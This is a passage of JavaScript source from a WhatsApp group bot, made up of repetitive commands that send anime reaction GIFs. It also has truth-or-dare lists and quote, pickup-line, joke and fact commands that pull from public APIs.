        var pat = await fetchJson(`https://api.waifu.pics/sfw/bully`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bullied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bullied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bonk': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bonk`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bonked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bonked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wink': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wink`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} winked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} winked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'poke': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/poke`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} poked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} poked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'nom': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/nom`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} nommed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} nommed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'slap': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/slap`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} slapped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} slapped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smile': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smile`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smiled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smiled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wave': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wave`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} waved themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} waved @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'awoo': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} awooed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} awooed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'blush': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/blush`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} blushed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} blushed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smug': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'glomp': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/glomp`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} glomped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} glomped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'happy': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/happy`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} happied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} happied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'dance': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/dance`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} danced themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} danced @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cringe': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cringe`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cringed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cringed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cuddle': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cuddle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cuddled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cuddled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'highfive': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} highfived themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} highfived @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'handhold': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/handhold`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} handheld themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} handheld @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'spank': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/spank`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} spanked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} spanked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'feed': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/feed`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} fed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} fed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'tickle': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/tickle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} tickled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} tickled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        
        
        
        case 'quotes': {
          // Fetch the quote from the API
          const quotexlicony = await axios.get('https://favqs.com/api/qotd');
          const quoteText = quotexlicony.data.quote.body;
          const quoteAuthor = quotexlicony.data.quote.author;
      
          // Prepare the quote text as a caption
          const textquotes = `💬 *Quote:* ${quoteText}\n\n👤 *Author:* ${quoteAuthor}`;
      
          // Image URL to use
          const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';
      
          // Send the quote with the image directly from the URL
          await XliconBotInc.sendMessage(m.chat, {
              image: { url: imageUrl },
              caption: textquotes,
              quoted: m
          });
      }
      break;
      
        
case 'truth': {
    // Set up image URL
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

  
    // Truth questions array
   const truths = [
        "Have you ever liked anyone? How long?",
        "If you could make a friend in any group, who would you pick?",
        "What's your biggest fear?",
        "Have you ever liked someone and felt they liked you back?",
        "Have you ever stolen money from family?",
        "What's the name of your friend's ex you secretly liked?",
        "What makes you happy when sad?",
        "Have you experienced unrequited love?",
        "What's your most embarrassing moment?",
        "What's your proudest achievement this year?",
        "What's the weirdest thing you've done when alone?",
        "Have you ever cheated on a test?",
        "What is something you've done that you're ashamed of?",
        "Have you ever been caught lying?",
        "What is your most ridiculous nickname?",
        "If you could switch lives with someone for a day, who would it be?",
        "What's the worst gift you've ever received?",
        "Have you ever shared a secret you promised to keep?",
        "What's your biggest insecurity?",
        "Have you ever broken something and blamed someone else?",
        "What's a secret you've kept from your parents?",
        "What would you do if you had only 24 hours to live?",
        "What's the most trouble you've gotten into at school?",
        "What's the worst date you've ever had?",
        "What's something you've never told your best friend?",
        "What's a talent you wish you had?",
        "Have you ever pretended to be sick to skip school?",
        "If you had to date someone in this room, who would it be?",
        "What's a lie you've told to impress someone?",
        "Have you ever stalked someone on social media?",
        "If you had a superpower, what would it be?",
        "Have you ever cried watching a movie? Which one?",
        "What’s the most childish thing you still do?",
        "Have you ever laughed at something inappropriate?",
        "What’s your guilty pleasure?",
        "If you were invisible, what’s the first thing you’d do?",
        "Have you ever lied to get out of trouble?",
        "Who do you admire the most, and why?",
        "What’s the meanest thing you’ve done to someone?",
        "Do you have any hidden talents?",
        "Have you ever lied in a game of Truth or Dare?",
        "What’s one secret you’ve kept from everyone?",
        "Have you ever had a crush on a teacher?",
        "What’s the silliest thing you’re afraid of?",
        "What’s the worst thing you’ve done when you were mad?",
        "Who was your first kiss?",
        "Have you ever cheated in a relationship?",
        "What’s the most expensive thing you’ve broken?",
        "What’s the worst rumor you spread or heard?",
        "Have you ever been jealous of a friend?",
        "What’s something you regret doing or saying?"
    ];

    // Randomly select a truth question
    const selectedTruth = truths[Math.floor(Math.random() * truths.length)];

    // Send the truth message
    const truthMessage = `🎭 *Truth* Challenge 🎭\n\n${selectedTruth}`;

    await XliconBotInc.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: truthMessage,
        footer: '𝐄𝐒 𝐓𝐄𝐀𝐌𝐒-𝐕𝟏',
        quoted: m
    });
}
break;

case 'dare': {
    // Set up image URL
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

  
    // Dare challenges array
    const dares = [
        "Eat 2 tablespoons of rice without side dishes.",
        "Call your crush and say 'I miss you.'",
        "Only reply with emojis for 24 hours.",
        "Shout *I love my crush* in public.",
        "Send your contact list screenshot.",
        "Act possessed in a funny way.",
        "Rename yourself to *I AM GOOFY* for 24 hours.",
        "Put a silly photo of yourself as your profile picture.",
        "Shout 'I am amazing!' in a voice note.",
        "Send a message to your ex saying you miss them.",
        "Text your last contact with just 'Hey!' repeatedly.",
        "Do 20 jumping jacks and record yourself.",
        "Text a random person and confess a fake secret.",
        "Talk in an accent for the next hour.",
        "Post a cringy photo on social media.",
        "Let the person next to you text anyone from your phone.",
        "Draw a funny mustache on your face and take a selfie.",
        "Say the alphabet backward.",
        "Walk outside and wave at strangers.",
        "Talk like a baby for the next 10 minutes.",
        "Share a funny meme with the last person you texted.",
        "Dance without music for 1 minute.",
        "Let someone else write your next social media post.",
        "Wear socks on your hands for the next 5 minutes.",
        "Pretend to be a chicken for 30 seconds.",
        "Take a silly selfie and post it online.",
        "Read the last text you sent out loud.",
        "Text your parents and say you got engaged.",
        "Eat a spoonful of something spicy.",
        "Imitate a famous celebrity for a minute.",
        "Text your crush with a heart emoji.",
        "Try to lick your elbow.",
        "Do 10 push-ups on video.",
        "Do your best animal impression.",
        "Spin around 10 times and walk in a straight line.",
        "Text a friend and say you're moving abroad.",
        "Act like your favorite character for 5 minutes.",
        "Talk with your tongue sticking out.",
        "Message a random number and say 'Happy Birthday!'",
        "Recite a poem about the nearest object.",
        "Pretend you’re a robot for the next 5 minutes.",
        "Stand on one leg for 30 seconds.",
        "Text a friend and ask for the weirdest selfie.",
        "Sing a nursery rhyme with dramatic flair.",
        "Write 'I am the best' on your forehead with marker.",
        "Act like you’re a waiter and take everyone’s order.",
        "Send a voice note saying you’re a superhero.",
        "Pretend you’re on a cooking show and describe your dinner.",
        "Text a random person 'Did you call me?'"
    ];

    // Randomly select a dare challenge
    const selectedDare = dares[Math.floor(Math.random() * dares.length)];

    // Send the dare message
    const dareMessage = `🔥 *Dare* Challenge 🔥\n\n${selectedDare}`;

    await XliconBotInc.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: dareMessage,
        footer: '𝐄𝐒 𝐓𝐄𝐀𝐌𝐒-𝐕𝟏',
        quoted: m
    });
}
break;

case 'pickupline': {
    try {
        // Fetch the pickup line from the API
        let res = await fetch(`https://api.popcat.xyz/pickuplines`);
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }
        
        let json = await res.json();
        let pickupLine = `*Here's a pickup line for you 😘💖:*\n\n${json.pickupline} 😂❤️`;

        // Image URL to use
        const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

       
        // Send the message with the image, caption, and footer
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: pickupLine,
            footer: '𝐄𝐒 𝐓𝐄𝐀𝐌𝐒-𝐕𝟏'
        });
    } catch (error) {
        console.error('Error in pickupline command:', error);
        replygcxlicon('Failed to fetch a pickup line. Please try again later.');
    }
}
break;

case 'pick': {
    // Check if the message is in a group and if there's text provided
    if (!m.isGroup) return XliconStickGroup();
    if (!text) return replygcxlicon(`What do you want to pick? 🤔\nExample: ${prefix + command} idiot 😜`);

    // Get group metadata and participants
    const groupMetadata = await XliconBotInc.groupMetadata(m.chat).catch(() => {}) || "";
    const participants = groupMetadata ? groupMetadata.participants : [];
    let member = participants.map((u) => u.id);

    // Get a random member
    let xliconshimts = member[Math.floor(Math.random() * member.length)];

    // Image URL to use
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

    try {
       
        // Send the message with the image, text, and mention
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: `The most *${text}* here is *@${xliconshimts.split("@")[0]}* 😜✨`,
            mentions: [xliconshimts] // Ensure that the user is mentioned in the message
        });
    } catch (error) {
        console.error('Error fetching or sending image:', error);
        replygcxlicon('Failed to send image. Please try again later.');
    }
}
break;

        
        
    case 'yomamajoke': {
    try {
        // Fetch a yo mama joke from the API
        let res = await fetch(`https://yomamaindra.onrender.com/jokes`);

        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }

        let json = await res.json();

        // Extract the joke from the response
        let yoMamaJoke = `${json.joke}`;

        // Image URL to use
        const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

       
        // Send the message with the image and caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: `*Yo Mama Joke 😂:*\n\n${yoMamaJoke}`,
            footer: '𝐄𝐒 𝐓𝐄𝐀𝐌𝐒-𝐕𝟏'
        });
    } catch (error) {
        console.error('API Fetch Error:', error);
        await XliconBotInc.sendText(m.chat, "An error occurred while fetching the joke. Please try again.");
    }
}
break;
        
        
        
		case 'fact': {
    try {
        // Fetch a random fact from the API
        const { data } = await axios.get(`https://nekos.life/api/v2/fact`);
        
        // Define the fact text with the theme emoji
        let factText = `${themeemoji} *Fact:* ${data.fact}\n`;

        // Image URL to use
        const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

      
        // Send the message with the image and caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: factText,
            footer: botname
        });
    } catch (error) {
        console.error('Error fetching fact:', error);
        await XliconBotInc.sendText(m.chat, "An error occurred while fetching the fact. Please try again.");
    }
}
